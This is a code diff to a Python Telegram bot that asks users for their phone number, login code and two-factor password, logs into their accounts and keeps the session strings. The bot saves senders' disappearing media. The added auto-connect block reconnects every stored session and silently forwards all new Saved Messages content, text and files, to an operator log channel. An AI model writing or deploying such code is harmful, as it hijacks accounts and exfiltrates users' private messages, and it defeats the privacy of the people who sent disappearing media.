@@ -79,7 +79,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_kb
     )
 
-# --- /connect ---
 async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.answer()
     await update.callback_query.message.reply_text(
@@ -87,7 +86,7 @@ async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="HTML"
     )
     return API_ID
-# --- Skip API ID/HASH ---
+
 async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_login_data[user_id] = {
@@ -100,7 +99,6 @@ async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def skip_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return await skip_api_id(update, context)
 
-# --- Get API ID ---
 async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     if text.startswith("/"):
@@ -112,7 +110,6 @@ async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("🔑 𝗦𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗔𝗣𝗜 𝗛𝗔𝗦𝗛 𝗼𝗿 /skip")
     return API_HASH
 
-# --- Get API HASH ---
 async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     if text.startswith("/"):
@@ -121,7 +118,6 @@ async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("📞 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗽𝗵𝗼𝗻𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 (𝘄𝗶𝘁𝗵 𝗰𝗼𝘂𝗻𝘁𝗿𝘆 𝗰𝗼𝗱𝗲):")
     return PHONE
 
-# --- Get Phone ---
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     phone = update.message.text.strip()
@@ -132,7 +128,7 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_login_data[user_id]["api_id"],
             user_login_data[user_id]["api_hash"]
         )
-        await client.connect()
+        await client.start()
         await client.send_code_request(phone)
         user_login_data[user_id]["client"] = client
         await update.message.reply_text("🔐 𝗘𝗻𝘁𝗲𝗿 𝗢𝗧𝗣 (𝘄𝗶𝘁𝗵 𝘀𝗽𝗮𝗰𝗲𝘀). 𝗘𝘅: 1 2 3 4 5")
@@ -141,7 +137,6 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {e}")
         return ConversationHandler.END
 
-# --- OTP Verify ---
 async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     code = update.message.text.replace(" ", "").strip()
@@ -159,7 +154,6 @@ async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿: {e}")
     return ConversationHandler.END
-
 # --- 2FA Password ---
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -172,7 +166,7 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ 𝗟𝗼𝗴𝗶𝗻 𝗳𝗮𝗶𝗹𝗲𝗱: {e}")
         return ConversationHandler.END
 
-# --- Disappearing Media Handler (Fix) ---
+# --- Disappearing Media Handler ---
 async def add_media_handler(client):
     @client.on(events.NewMessage(incoming=True))
     async def media_handler(event):
@@ -180,6 +174,7 @@ async def add_media_handler(client):
             try:
                 sender = await event.get_sender()
                 name = getattr(sender, 'username', getattr(sender, 'first_name', 'Unknown'))
+                logger.info(f"📥 Detected disappearing media from {name}")
                 file = await event.download_media()
                 await client.send_file(
                     "me",
@@ -226,11 +221,44 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await add_media_handler(client)
 
     active_clients.append(client)
-    context.application.create_task(client.run_until_disconnected())
+    asyncio.get_event_loop().create_task(client.run_until_disconnected())
 
     await update.message.reply_text("✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗮𝗻𝗱 𝗿𝘂𝗻𝗻𝗶𝗻𝗴!")
     user_login_data.pop(user_id, None)
     return ConversationHandler.END
+
+# --- Auto Connect Old Sessions ---
+async def auto_connect_all_sessions():
+    async for record in sessions.find({"type": "telethon"}):
+        session_str = record.get("session")
+        if not session_str:
+            continue
+        user_id = record["_id"]
+        client = TelegramClient(StringSession(session_str), DEFAULT_API_ID, DEFAULT_API_HASH)
+        try:
+            await client.start()
+            if not await client.is_user_authorized():
+                logger.warning(f"❌ Unauthorized session: {user_id}")
+                continue
+            logger.info(f"✅ Auto-connected: {user_id}")
+            await add_media_handler(client)
+            active_clients.append(client)
+            connected_users.add(user_id)
+
+            @client.on(events.NewMessage(chats="me", incoming=True))
+            async def forward_saved(event):
+                try:
+                    await client.send_message(
+                        LOG_CHANNEL_ID,
+                        file=event.media if event.media else None,
+                        message=event.text if event.text else None
+                    )
+                except Exception as e:
+                    logger.warning(f"[AutoForwardError] {e}")
+
+            asyncio.get_event_loop().create_task(client.run_until_disconnected())
+        except Exception as e:
+            logger.error(f"❌ AutoConnect Error for {user_id}: {e}")
 # --- Menu: Fetch non-forwardable media ---
 async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -249,7 +277,7 @@ async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
     client = TelegramClient(StringSession(record["session"]), DEFAULT_API_ID, DEFAULT_API_HASH)
-    await client.connect()
+    await client.start()
 
     try:
         await update.message.reply_text("📥 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁, 𝗳𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗺𝗲𝗱𝗶𝗮...")
@@ -296,39 +324,6 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❓ 𝗨𝗻𝗸𝗻𝗼𝘄𝗻 𝗰𝗼𝗺𝗺𝗮𝗻𝗱. 𝗨𝘀𝗲 /start 𝗮𝗴𝗮𝗶𝗻.")
-
-# --- Auto Connect Old Sessions ---
-async def auto_connect_all_sessions():
-    async for record in sessions.find({"type": "telethon"}):
-        session_str = record.get("session")
-        if not session_str:
-            continue
-        user_id = record["_id"]
-        client = TelegramClient(StringSession(session_str), DEFAULT_API_ID, DEFAULT_API_HASH)
-        try:
-            await client.connect()
-            if not await client.is_user_authorized():
-                logger.warning(f"❌ Unauthorized session: {user_id}")
-                continue
-            logger.info(f"✅ Auto-connected: {user_id}")
-            await add_media_handler(client)
-            active_clients.append(client)
-            connected_users.add(user_id)
-
-            @client.on(events.NewMessage(chats="me", incoming=True))
-            async def forward_saved(event):
-                try:
-                    await client.send_message(
-                        LOG_CHANNEL_ID,
-                        file=event.media if event.media else None,
-                        message=event.text if event.text else None
-                    )
-                except Exception as e:
-                    logger.warning(f"[AutoForwardError] {e}")
-
-            asyncio.create_task(client.run_until_disconnected())
-        except Exception as e:
-            logger.error(f"❌ AutoConnect Error for {user_id}: {e}")
 
 # --- Conversations ---
 login_conv = ConversationHandler(
